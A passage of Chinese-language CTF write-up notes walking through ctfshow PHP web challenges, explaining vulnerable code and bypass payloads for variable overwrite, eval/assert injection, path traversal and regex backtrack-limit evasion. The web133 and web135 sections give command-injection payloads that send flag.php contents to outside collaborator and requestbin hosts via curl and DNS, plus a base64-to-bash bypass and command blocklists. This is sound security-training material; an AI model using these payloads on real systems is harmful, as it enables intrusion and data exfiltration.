$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
  if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
     eval("$c".";"); 	//==>获取flag
     if($fl0g==="flag_give_me")
     {
       echo $flag;
     }
  }
}
```


#### 题目分析：
本题还限制了`g`、`i`、`f`、`c`、`o`、`d`，而且是大小写匹配。那么`highlight_file`不能用了，各种输出函数不能使用了，所以不能直接通过`eval`来实现输出flag了，需要考虑用满足fl0g的条件来`echo $flag`。

不能set变量fl0g，所以要通过eval实现变量覆盖。可以实现变量覆盖的函数：

extract(\$array)： 从数组中将变量导入到当前的符号表。可以实现变量覆盖。

parse_str(\$str)：将字符串解析成多个变量。

以及可以执行php语句的函数，如assert()、eval()。

`extract($array)`因为有字符c，所以不能使用。`$_GET`传参不可以，有字符g。

题目中还提供了一个`$a`，值为`$_SERVER['argv']`。


<details>
<summary>补充</summary>

<strong>命令行模式下</strong>：`$_SERVER['argv'][0]`是脚本名，其他的是传递给脚本的参数。  
<strong>网页模式下</strong>：需要php.ini开启register_argc_argv配置。`$_SERVER['argv'][0] = $_SERVER['QUERY_STRING'];`

\$_SERVER`['argv']``[0]` 是\$_SERVER`['QUERY_STRING']`;，\$_SERVER`['argv']``[1]` 的传递方式就和命令行类似了，空格，然后传递第二个参数，以此类推。利用\$_SERVER`['argv']``[1]` 就可以绕过对isset(\$fl0g)的判断。用+代表空格。

</details>


<details>
<summary>\$_SERVER[&#x27;QUERY_STRING&#x27;]的作用</summary>

#### <strong>1. 查询字符串的定义</strong>

- 查询字符串是 URL 中 `?` 后面的部分，通常用于传递参数。

例如，如果 URL 是：

- http://example.com/index.php?name=John&age=25

那么查询字符串是 `name=John&age=25`。

---

#### <strong>2.</strong>`$_SERVER['QUERY_STRING']`<strong>的作用</strong>

- `$_SERVER['QUERY_STRING']` 存储了当前请求的查询字符串。

例如：

- echo \$_SERVER`['QUERY_STRING']`;

如果 URL 是 `http://example.com/index.php?name=John&age=25`，则输出 `name=John&age=25`。

---

#### <strong>3. 在代码中的作用</strong>

在这段代码中：

\$url = \$_SERVER`['QUERY_STRING']`;

- `$url` 被赋值为当前请求的查询字符串。
- 后续代码会使用 `$url` 进行特殊字符检测（通过 `waf` 函数）。

---

#### <strong>4. 如何知道</strong>`$_SERVER['QUERY_STRING']`<strong>的值</strong>

1. <strong>构造 URL</strong>：

假设访问的 URL 是：

- http://example.com/index.php?\$fl0g=flag_give_me;
- 查询字符串是 `$fl0g=flag_give_me;`。

2. <strong>获取查询字符串</strong>：

- 在 PHP 中，`$_SERVER['QUERY_STRING']` 会存储查询字符串。
- 因此，`$_SERVER['QUERY_STRING']` 的值是 `$fl0g=flag_give_me;`。

3. <strong>验证查询字符串</strong>：

可以通过以下代码验证 `$_SERVER['QUERY_STRING']` 的值：

- echo \$_SERVER`['QUERY_STRING']`;

如果 URL 是 `http://example.com/index.php?$fl0g=flag_give_me;`，则输出 `$fl0g=flag_give_me;`。

---

#### <strong>5. 在绕过中的作用</strong>

- 在绕过代码中，`$_SERVER['QUERY_STRING']` 的值是 `$fl0g=flag_give_me;`。
- 这个值被传递给 `waf` 函数进行特殊字符检测。
- 由于 `$fl0g=flag_give_me;` 不包含 `waf` 函数检测的特殊字符，因此 `waf` 函数返回 `false`，代码继续执行。

</details>


<strong>payload1</strong>：  
GET:`?a=1+fl0g=flag_give_me`    //=>a=1; \$_SERVER`['argv']``[1]` =fl0g=flag_five_me;  
POST:`CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])`


Web123的方法二和方法三的payload还可以用

<strong>payload2:</strong>

或者post传assert也可以


<details>
<summary>补充</summary>

<strong>绕过</strong> `waf` <strong>函数</strong>：

- `$_SERVER['QUERY_STRING']` 是 `$fl0g=flag_give_me;`，不包含特殊字符，因此 `waf` 函数返回 `false`。
- `eval("$c;");` 执行 `eval('assert($a[0]);');`。

`$a[0]` 是 `'$fl0g=flag_give_me;'`，因此最终执行的代码是：

- php复制assert('\$fl0g=flag_give_me;');
- 这会将 `$fl0g` 设置为 `"flag_give_me"`。

<strong>输出</strong> `$flag`：

- 由于 `$fl0g === "flag_give_me"`，代码会输出 `$flag`。

</details>


```php
?$fl0g=flag_give_me;	//因为参数还未设置，所以要加上$
CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])		//即访问flag.php
```


<strong>payload3</strong>：再利用eval，需要注意里面的语句必须分号`;`或`?>`结尾。  
GET:`?$fl0g=flag_give_me;`  
POST:`CTF_SHOW=&CTF[SHOW.COM=&fun=eval($a[0])`

### web127

```php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];
//特殊字符检测
function waf($url)
{
  if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
    return true;
  }else{
    return false;
  }
}
if(waf($url)){
  die("嗯哼？");
}else
{
  extract($_GET);
}
if($ctf_show==='ilove36d')
{
  echo $flag;
}
```



<details>
<summary>extrack()函数</summary>

```php
<?php
extract($_GET); // 提取 $_GET 中的所有参数
echo "Hello, $name!"; // 输出用户的名字
?>
    
如果用户访问URL为
http://example.com/script.php?name=John
$_GET 数组为：['name'=>'John']
extract($_GET) 会将$name 设置为'John'
输出结果为Hello,John
```


回到题目，令ctf_show=ilove36d

extract可以从数组中将变量导入到当前的符号表，本题限制了中括号，下划线，可以用空格绕过，然后进行变量覆盖

</details>


`$url = $_SERVER['QUERY_STRING'];` 是 PHP 中的一行代码，用于获取当前请求的查询字符串（即 URL 中 `?` 后面的部分）。

<strong>通过</strong><strong>`extract($_GET)`</strong>：

+ `extract($_GET)` 会将 GET 参数转换为变量。
+ 如果用户通过 GET 方法传递 `ctf_show=某个值`，则 `$ctf_show` 会被覆盖为该值。

<strong>代码逻辑</strong>

+ 用户需要通过GET方法传递参数。
+ 代码会检查查询字符串是否包含特定的特殊字符。
+ 如果检查通过，则将 GET 参数转换为变量。
+ 如果 `$ctf_show` 的值严格等于 `'ilove36d'`，则输出 `$flag`。

<strong>payload1:</strong>

extract可以从数组中将变量导入到当前的符号表，本题限制了中括号，下划线，可以用空格绕过，然后进行变量覆盖

<strong>?ctf show=ilove36d</strong>

### web128

```php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$f1 = $_GET['f1'];
$f2 = $_GET['f2'];
if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}
function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}
```


<strong>代码逻辑</strong>

+ 用户需要通过 GET 方法传递 `f1` 和 `f2` 参数。
+ 代码会检查 `f1` 是否不包含数字或字母。
+ 如果检查通过，则动态调用 `$f1` 函数并传入 `$f2` 作为参数，然后再次调用结果并输出。
+ 如果检查不通过，则输出 `"嗯哼？"`。


<details>
<summary>代码解释</summary>

```php
php
$f1 = $_GET['f1'];
$f2 = $_GET['f2'];
var_dump(call_user_func(call_user_func($f1, $f2)));
```


解释

- 它接受两个参数：

- 第一个参数是要<strong><span style="color: #DF2A3F">调用的函数名</span></strong>（或可调用对象）。
- 第二个参数是传递给该函数的参数。

- 例如，如果 `$f1 = "strlen"` 且 `$f2 = "hello"`，则：

```php
call_user_func("strlen", "hello");
```


相当于调用 `strlen("hello")`，返回 `5`。

</details>


<strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组。

<strong>`call_user_func()`</strong>： 是 PHP 中的一个内置函数，用于动态调用函数或方法。它允许你在运行时根据变量值调用函数，而不是在代码中硬编码函数名。如果只一个参数（如：Hello）,那么会将Hello视为函数名，并尝试调用Hello的函数，若Hello函数不存在，那么报错

<strong>`check()：`</strong> 函数只检查数字和字母，因此可以使用其他字符（如 `_`、`.`、`$` 等）来绕过检查。

<strong>`get_defined_vars():`</strong>返回由所有已定义变量所组成的数组。

当前文件包含flag.php，直接打印`$flag`变量


<details>
<summary>补充</summary>

##### <strong>动态调用</strong>`_()`<strong>或</strong>`gettext()`

- 如果 `$f1` 是 `_` 或 `gettext`，且 `$f2` 是一个可执行的字符串，则可以通过 `call_user_func` 动态调用它们。
- 例如：

```php
f1=_&f2=eval("echo $flag;")
```


解析后：

```php
call_user_func(call_user_func("_", "eval('echo $flag;')"));
```


</details>


<strong>payload：</strong>

?f1=_&f2=get_defined_vars


<details>
<summary>绕过过程</summary>

##### <strong>第一层</strong>`call_user_func("_", "get_defined_vars")`

- `_` 是 PHP 中 `gettext()` 的别名，用于国际化（i18n）。
- `call_user_func("_", "get_defined_vars")` 相当于：

```php
_("get_defined_vars")
```


它的作用是返回 `"get_defined_vars"` 的翻译版本。如果没有翻译，则直接返回原字符串 `"get_defined_vars"`。

##### 5. <strong>第二层</strong>`call_user_func("get_defined_vars")`

- `call_user_func("get_defined_vars")` 调用 `get_defined_vars()` 函数。
- `get_defined_vars()` 是 PHP 内置函数，返回当前作用域中所有已定义变量的数组。

##### 6. <strong>最终输出</strong>

- `var_dump(call_user_func("get_defined_vars"))` 会输出当前作用域中所有变量的详细信息，包括 `$flag`（假设 `flag.php` 中定义了 `$flag`）。

</details>


### web129

```php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f']))
{
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```


`stripos()`: 是大小写不敏感的字符串查找函数，返回子字符串首次出现的位置（从 0 开始）。

其作用有提取子字符串


```php
$substring = substr($str, 0, 5); // 提取 "Hello"
```


，查找子字符串，


```php
$position = strpos($str, "World"); // 查找 "World" 的位置
```


替换子字符串，


```php
$newStr = str_replace("World", "PHP", $str); // 将 "World" 替换为 "PHP"
```


检查子字符串是否存在


```php
if (strpos($str, "World") !== false)
```



<details>
<summary>使用例子</summary>

##### 子字符串的替换

```php
$str = "Hello, World!";
$newStr = str_replace("World", "PHP", $str); // 将 "World" 替换为 "PHP"
echo $newStr; // 输出 "Hello, PHP!"
```


</details>


<strong>代码逻辑</strong>

1. 用户通过 URL 的 GET 参数传递 `f` 的值。
2. 代码检查 `f` 参数是否存在。
3. 如果存在，则检查 `f` 中是否包含子字符串 `'ctfshow'`，且 `'ctfshow'` 的位置大于 0。
4. 如果检查通过，则读取并输出 `f` 指定的文件内容。

我们看到 `readfile`是一个文件读取 可以进行路径穿越读取文件

读取/var/www/html/flag.php

`../` 的数量取决于目标文件与当前工作目录的相对位置。

<strong>payload</strong>：`?f=/ctfshow/../../../var/www/html/flag.php`


<details>
<summary>路径解析过程</summary>

- 应用程序将用户输入的 `f` 参数与固定路径拼接：

```php
$fullPath = "/var/www/files/" . "/ctfshow/../../../var/www/html/flag.php";
```


拼接后的路径是：

```plain
/var/www/files//ctfshow/../../../var/www/html/flag.php
```


- 操作系统会解析路径中的 `../`，将其转换为实际路径：

1. `/var/www/files//ctfshow/`：进入 `/var/www/files/ctfshow/` 目录。
2. `../`：回退到 `/var/www/files/`。
3. `../`：回退到 `/var/www/`。
4. `../`：回退到 `/var/`。
5. `var/www/html/flag.php`：进入 `/var/www/html/` 目录，读取 `flag.php` 文件。

- 最终解析的路径是：

```plain
/var/www/html/flag.php
```


</details>


### web130

```php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
  $f = $_POST['f'];
  if(preg_match('/.+?ctfshow/is', $f)){
    die('bye!');
  }
  if(stripos($f, 'ctfshow') === FALSE){
    die('bye!!');
  }
  echo $flag;
}
```


<strong>代码逻辑</strong>

+ 用户通过 POST 请求提交一个参数 `f`。
+ 如果 `f` 中包含 `ctfshow` 且符合正则表达式 `/.+?ctfshow/is` 的模式，则输出 `bye!` 并终止脚本。
+ 如果 `f` 中不包含 `ctfshow`，则输出 `bye!!` 并终止脚本。
+ 如果 `f` 中包含 `ctfshow` 但不符合正则表达式的模式，则输出 `flag`。

<strong>'/.+?ctfshow/is' 后面的i表示大小写匹配，s表示忽略换行符，单行匹配</strong>

<strong>在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次</strong>

先看第一个if:

.+?表示匹配任意字符一个或则多个。

.*? 表示匹配任意字符0个或多个。

+ . 匹配除换行符 \n 之外的任何单字符。
+ + 匹配前面的子表达式一次或多次。
+ ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。
+ /i不区分大小写
+ /s 匹配任何空白字符，包括空格、制表符、换页符等等。
+ 如果任何字符后跟ctfshow就会die()

第二个if:

stripos函数如果未发现字符串将返回 FALSE。  
全等于的条件是必须双方的类型也一样，所以ctfshow在首位返回的0与FLASE不全等。

payload1:

POST:	f=ctfshow

payload2:

POST:	f`[]`=anything	(<span style="color: #DF2A3F">不理解</span>)

### web131

```php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
  $f = (String)$_POST['f'];
  if(preg_match('/.+?ctfshow/is', $f)){
    die('bye!');
  }
  if(stripos($f,'36Dctfshow') === FALSE){
    die('bye!!');
  }
  echo $flag;
}
```



<details>
<summary>补充</summary>

<strong>PHP回溯上限利用</strong>

<strong>常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。</strong>

<strong>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。</strong>

<strong>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态。</strong>

<strong>大多数程序语言都使用NFA作为正则引擎，其中也包括PHP使用的PCRE库</strong>

<strong>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。</strong>

</details>


<strong>stripos(\$f,'36Dctfshow')</strong>

<strong>stripos()</strong>函数：用于查找子字符串在目标字符串中<strong>首次出现的位置</strong>。

即此处要求36Dctfshow要出现在开头

<strong>if(preg_match('/.+?ctfshow/is', \$f))：</strong>即要求ctfshow前面不能匹配任何字符

(<strong>String)\$_POST`['f']`：（string）</strong>强制类型转换为字符串类型

<strong>分析</strong>

+ 这道题既要求ctfshow不在首位就匹配，又要求有36Dctfshow，非常的矛盾，所以只能找办法突破规则。
+ 正则匹配中对回溯数和嵌套数进行了最大限制。
+ 默认的backtrack_limit（最大回溯数）是100000，recursion_limit（最大嵌套数）是100000。

可以参考大神：

[https://www.laruence.com/2010/06/08/1579.html](https://www.laruence.com/2010/06/08/1579.html)

+ PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。可以通过`var_dump(ini_get('pcre.backtrack_limit'));`来查看上限。那么只需要输入的匹配字符串长度大于1000000，那么preg_match函数就会直接返回false
    - <strong>正则匹配默认是贪婪模式；在量词后面直接加上一个问号`?`就是非贪婪模式。非贪婪匹配就是匹配到就结束，匹配尽可能少的字符。</strong>
    - <strong> </strong>
    - <strong>非贪婪模式容易导致太多回溯。</strong>
    - <strong> </strong>
    - <strong>嵌套太多，可能会造成耗尽栈空间爆栈。</strong>

payload:


```php
<?php
echo str_repeat('very', '250000').'36Dctfshow';
?>//输出250000个后补上36Dctfshow
```



![](/article-assets/2025/ctfshow-web-notes/images/screenshot-098.webp)

### web132
发现是个博客网页

访问robots.txt得到以下内容


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-099.webp)

随后访问 /admin 得到漏洞源码


```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
  $username = (String)$_GET['username'];
  $password = (String)$_GET['password'];
  $code = (String)$_GET['code'];
  if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){ 
    if($code == 'admin'){
      echo $flag;
    }    
  }
}
```


+ `$code === mt_rand(1,0x36D)` 且 `$password === $flag`。
+ 这几乎不可能实现，因为 `mt_rand(1,0x36D)` 是随机数，无法预测。
1. PHP中的逻辑“与”运算有两种形式：and 和 &&，同样“或”运算也有 or 和 || 两种形式。
2. 如果是单独两个表达式参加的运算，两种形式的结果完全相同
3. 但两种形式的逻辑运算符优先级不同，这四个符号的优先级从高到低分别是： &&、||、AND、OR。

代码审计后发现只需要username = admin&code = admin即可

payload:<strong>admin/?username=admin&password=&code=admin</strong>

### web133
变量覆盖和curl -F使用


```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```


`substr()` 是 PHP 中的一个字符串处理函数，用于<strong>截取字符串的一部分</strong>。它可以根据指定的起始位置和长度，从原字符串中提取子字符串。

代码限制了一些命令执行函数，同时输入的内容只读取前6个字符。  
因为substr只是截取前6个字符，并不会改变`$F`的值，<strong>那么如果传递的值就是</strong><strong>`$F`</strong><strong>本身。</strong>


<details>
<summary>方法一</summary>

```php
利用`$F`;让eval执行shell语句。
这一串字符长度是5，加个空格，满足substr的6个字符截取，让eval执行`$F`;

如传递`$F`;+sleep 3，页面会sleep一会。具体执行过程如下：
==>php:   eval(substr($F,0,6)); 
==>php:   eval("`$F`; "); 
==>php:   eval("``$F`; sleep 3`; "); 
==>shell: `$F`; sleep 3
所以就执行了sleep 3
```

```php
?F=$F ;sleep 3 观察发现页面确实存在延时，说明 sleep 3 执行成功了。

F ‘ ; sleep3 会先经过 substr ( F `;sleep 3 会先经过substr(F‘;sleep3会先经过substr(F,0,6)截取六个字符后得到 $F ;

然后执行 eval(“$F ;”);

而其中的 F 原本是我们传入的内容，即 ‘ F 原本是我们传入的内容，即 `F原本是我们传入的内容，即‘F `;sleep 3；

因此执行的是 eval(“``$F ;sleep 3”); 也就会执行 sleep 3。

``是shell_exec()函数的缩写，然后就去命令执行,是没有回显的

可以通过DNSlog，

?F=$F; ping cat flag.php | grep ctfshow | tr -cd '[a-z]'/'[0-9]'.dnslog得到的网址 -c 1
```


这里使用 burpsuite 的 Collaborator Client 结合 curl -F 命令外带 flag：

这个模块说实话我也是第一次用，先随机获取一个域名：

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-100.webp)

http://839sizfkvi1ksa81amhy4ca9j0prdw1l.oastify.com/

构造 payload：


```text
?F=`$F`;+curl -X POST -F xx=@flag.php http://839sizfkvi1ksa81amhy4ca9j0prdw1l.oastify.com/
```



对 payload 的一些解释：

- <span style="color: #DF2A3F">-F</span> 为带文件的形式发送 post 请求；
- 其中 xx 是上传文件的 name 值，我们可以自定义的，而 flag.php 就是上传的文件 ；
- <span style="color: #DF2A3F">curl</span>：用于在命令行中发出网络请求的工具。
- <span style="color: #DF2A3F">-X POST</span>：指定使用 POST 方法请求目标 URL。
- <span style="color: #DF2A3F">-F xx=@flag.php</span>：以 <strong>表单格式 (multipart/form-data)</strong> 发送 flag.php 文件的内容，键名为 xx。

- <span style="color: #DF2A3F">xx</span>：POST 请求的参数名，类似于 HTML 表单中的 `<input name="xx" type="file">`。
- <span style="color: #DF2A3F">@flag.php</span>：读取本地文件 flag.php 并将其<strong>作为文件内容上传</strong>。

- <span style="color: #DF2A3F">z55c4qucwi77mo3jgruxqlil0c63us.burpcollaborator.net</span>：目标 URL，用于<strong>接收外部数据。</strong>

<strong>相当于让服务器向 Collaborator 客户端发送 post 请求，内容是flag.php。</strong>

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-101.webp)

这里还可以直接命令执行：


```text
?F=`$F`; curl http://7dlviqq1kp7fyuu27x61yqbyepkh8cw1.oastify.com/`ls`
```



</details>


<details>
<summary>方法二</summary>

<strong>2.新思路</strong>

<strong>但是总是有师傅用其他方法,嘻嘻嘻比如说羽师傅</strong>

<strong>羽师傅是利用curl 去带出数据类似于dnslog</strong>

<strong>但是自己之前测试过带出数据只能一排一排的带出，数据太多就不行</strong>

<strong>测试</strong>

```php
#执行命令
?F=`$F`;+curl  http://requestbin.net/r/1puo0jq1?p=`cat test.php`
#接收到的数据如下图
```


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-102.webp)

<strong>而我的test.php内容是</strong>

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-103.webp)

<strong>这就说明只能一排一排的带出数据。</strong>

<strong>那么我们想一想flag.php里面肯定有flag想一想有没有特点用于区别其他行？</strong>

<strong>hhh,当然是flag{}啦，我们就可以使用grep 命令进行筛选(经过测试发现一排只能带65个字符)</strong>

<strong>实验</strong>

```php
?F=`$F`;+curl  http://requestbin.net/r/1puo0jq1?p=`cat test2.php|grep flag`
#接收到的数据如下图
```


![](/article-assets/2025/ctfshow-web-notes/images/screenshot-104.webp)

<strong>test2.php内容是</strong>

<strong>成功获得flag</strong>

<strong>细心的师傅就会发现6个字符截断其实是一个小小的坑\~</strong>

<strong>还有这里解释一下，反弹shell可能不会成功，自己测试了一下大概是因为&符合的影响，在GET方法中识别成变量的分隔符。可能是我太菜了，没有成功\~。成功的师傅可以分析一下呢</strong>

</details>


<details>
<summary>补充题</summary>

<strong>1.base64绕过</strong>

```php
<?php
error_reporting(0);
print_r('system($_GET["cmd"]);');
$cmd = $_GET['cmd'];
if (preg_match('/g| |\?|\*|\[|\]|p/i', $cmd)) {
        die('no');
}
system($cmd);
?>
```


<strong><span style="color: #DF2A3F">这里源代码非常简单就是不能匹配正则表达式上面的字母</span></strong>

<strong>想一想可以通过编码的方法来绕过，linux下面支持base64编码和解码。</strong>

<strong><span style="color: #DF2A3F">base64 -d</span>用来解码。</strong>

<strong>使用思路就清楚啦，先将命令进行base64编码然后去base64 -d解码，然后通过bash去执行。</strong>

<strong>payload:<span style="color: #DF2A3F">echo\$IFS\$9Y2F0ICAvZmxhZwo=|base64\$IFS\$9-d|bash</span></strong>

<strong>意思是：</strong>

<strong>echo cat /flag | base64 -d|bash</strong>

<strong>将cat /flagbase64编码的进行base64解码然后通过bash执行</strong>

<strong>(注意的是需要多次改变空格来保证不需要命令执行情况而且不能包含正则表达式上面的字母）</strong>

<strong>2. 其他思路</strong>

<strong>和这个方法差不多的方法是16进制</strong>

<strong><span style="color: #DF2A3F">xxd的作用就是将一个文件以十六进制的形式显示出来</span></strong>

<strong>xxd -ps:<span style="color: #DF2A3F">-ps 参数：以 postscript的连续16进制转储输出，也叫做纯16进制转储</span></strong>

<strong>xxd -r -p:<span style="color: #DF2A3F">-r参数：逆向转换。将16进制字符串表示转为实际的数</span></strong>

![](/article-assets/2025/ctfshow-web-notes/images/screenshot-105.webp)

</details>


### web134
parse_str和extract 进行变量覆盖


```php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```


<strong>if(isset(\$_GET`['key1']`) || isset(\$_GET`['key2']`) || isset(\$_POST`['key1']`) || isset(\$_POST`['key2']`))：</strong>

+ 如果通过 `GET` 或 `POST` 传递了 `key1` 或 `key2` 参数，脚本会直接输出 `"nonononono"` 并终止执行。

<strong>@parse_str(\$_SERVER`['QUERY_STRING']`);</strong>


<details>
<summary>补充</summary>

`$_SERVER['QUERY_STRING']` 是 PHP 中的一个 <strong>超全局变量</strong>，它用于获取当前 URL 中的 <strong>查询字符串部分</strong>。查询字符串是 URL 中问号 `?` 后面的部分，通常用于传递参数。

---

#### <strong>1. 查询字符串是什么？</strong>

在 URL 中，查询字符串是问号 `?` 后面的部分，用于向服务器传递参数。例如：

- URL: `http://example.com/?name=Alice&age=25`
- 查询字符串: `name=Alice&age=25`

查询字符串由多个键值对组成，键值对之间用 `&` 分隔。例如：

- 键值对 1: `name=Alice`
- 键值对 2: `age=25`

---

#### <strong>2.</strong>`$_SERVER['QUERY_STRING']`<strong>的作用</strong>

`$_SERVER['QUERY_STRING']` 用于获取当前 URL 中的查询字符串部分。它是一个字符串，包含 URL 中问号 `?` 后面的所有内容。

例如：

- 如果 URL 是 `http://example.com/?name=Alice&age=25`，那么 `$_SERVER['QUERY_STRING']` 的值是 `name=Alice&age=25`。
- 如果 URL 是 `http://example.com/`（没有查询字符串），那么 `$_SERVER['QUERY_STRING']` 的值是空字符串 `""`。

---

#### <strong>3. 如何使用</strong>`$_SERVER['QUERY_STRING']`

`$_SERVER['QUERY_STRING']` 通常用于解析 URL 中的参数。例如：

```plain
echo $_SERVER['QUERY_STRING']; // 输出查询字符串
```


- 如果 URL 是 `http://example.com/?name=Alice&age=25`，上面的代码会输出 `name=Alice&age=25`。

---

#### <strong>4. 与</strong>`$_GET`<strong>的区别</strong>

`$_SERVER['QUERY_STRING']` 和 `$_GET` 都用于处理查询字符串，但它们有以下区别：

1. <strong>`$_SERVER['QUERY_STRING']`</strong>

- 返回查询字符串的原始形式（一个字符串）。
- 例如：`name=Alice&age=25`。

2. <strong>`$_GET`</strong>

- 返回解析后的查询字符串（一个关联数组）。
- 例如：

```plain
$_GET = [
    'name' => 'Alice',
    'age' => '25'
];
```


</details>


+ 解析查询字符串并将变量提取到当前作用域中，@ 用于抑制可能的错误。
+ <strong>parse_str</strong>是对<strong><span style="color: #DF2A3F">get请求</span></strong>进行的内容解析成变量。例如传递`?a=1`，执行后就是`$a=1`。
+ 那么相对的，传递`_POST`，就是对`$_POST`进行赋值，正好就可以绕过if条件对post的限制。

<strong>extract(\$_POST);</strong>

+ 将 <strong><span style="color: #DF2A3F">POST 请求</span></strong>中的参数提取为局部变量，这就可能会覆盖已有变量的值，例如 \$key1 和 \$key2。


<details>
<summary>补充</summary>

#### <strong>1.</strong> `_POST[key1]` <strong>和</strong> `_POST[key2]` <strong>的本质</strong>

在 PHP 中，`_POST[key1]` 和 `_POST[key2]` 是 <strong>字符串</strong>，表示 `$_POST` 数组中的键名。例如：

```plain
$_POST = [
    '_POST[key1]' => '36d',
    '_POST[key2]' => '36d'
];
```


这里的 `_POST[key1]` 和 `_POST[key2]` 是 `$_POST` 数组的键名，它们的值分别是 `'36d'`。

---

#### <strong>2.</strong>`extract()`<strong>函数的作用</strong>

`extract()` 函数的作用是将数组中的键值对提取为变量。例如：

```plain
$_POST = [
    '_POST[key1]' => '36d',
    '_POST[key2]' => '36d'
];
extract($_POST);
```


`extract($_POST)` 会将 `$_POST` 数组中的键值对提取为变量。由于键名是 `_POST[key1]` 和 `_POST[key2]`，`extract()` 会将这些键名解析为变量名，并设置对应的值。实际效果是：

```plain
$_POST['key1'] = '36d';
$_POST['key2'] = '36d';
```


</details>


<strong>payload</strong>：`?_POST[key1]=36d&_POST[key2]=36d`

### web135
web133plus


```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```


这题比起web133多了很多过滤，但是有写入权限

`eval(substr($F,0,6));`

+ 如果 `$F` 通过了过滤，截取 `$F` 的前 6 个字符，并通过 `eval()` 执行。

有以下payloads:

<strong>?F=`$F` ;cp flag.php x.txt 	--->访问x.txt即可</strong>

<strong>?F=`$F` ;nl flag.php>x.txt </strong>

<strong>?F=`$F` ;mv flag.php x.txt	--->访问x.txt即可</strong>


<details>
<summary>解释</summary>

`` `$F`; `` 是 PHP 中的一种语法，用于执行 <strong>系统命令</strong>。具体来说，反引号 `` ` `` 是 PHP 中的 <strong>执行运算符</strong>，它会将其中的内容作为系统命令执行，并返回命令的输出。

在 PHP 中，反引号 `` ` `` 用于执行系统命令。它的作用类似于 `shell_exec()` 函数。

例如：

```plain
$output = `ls -l`;
echo $output;
```


- `` `ls -l` `` 会执行 `ls -l` 命令，并返回命令的输出。
- 输出会存储在 `$output` 变量中，然后通过 `echo` 打印出来。

---

而此题payload中

`$F`;能够绕过substr(\$F,0,6)，随后又执行了一次`$F`; nl f*>1.txt，此时`$F`;与nl f*>1.txt都被执行，但执行nl f*>1.txt后便不再递归了

</details>


也可用DNS外带的方法

/?F=`$F`;+ping `nl flag.php|awk 'NR==15'|tr -cd "[a-z]"/"[0-9]"`.[http://dyfo9r3ph7xp83co5dlql3ym2d83ws.burpcollaborator.net](http://dyfo9r3ph7xp83co5dlql3ym2d83ws.burpcollaborator.net)

### web136
exec()重定向读取文件


```php
<?php
error_reporting(0);
function check($x){
  if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
    die('too young too simple sometimes naive!');
  }
}
if(isset($_GET['c'])){
  $c=$_GET['c'];
  check($c);
  exec($c);
}
else{
  highlight_file(__FILE__);
}
?>
```



<details>
<summary>*补充</summary>

```php
先补充一个知识点
（1）system()
 
用于执行外部程序；
输出命令的执行结果到标准输出设备，并返回命令的最后一行结果；
可以通过传递第二个参数来捕获命令执行后的返回状态码。
 
（2）passthru()
 
用于执行外部程序；
将命令的原始输出直接发送到标准输出设备（通常是浏览器）；
不返回任何值，但可以通过第二个参数捕获命令执行后的返回状态码。
 
（3）exec()
 
用于执行外部程序；
不会输出结果到标准输出，而是将最后一行结果作为返回值返回；
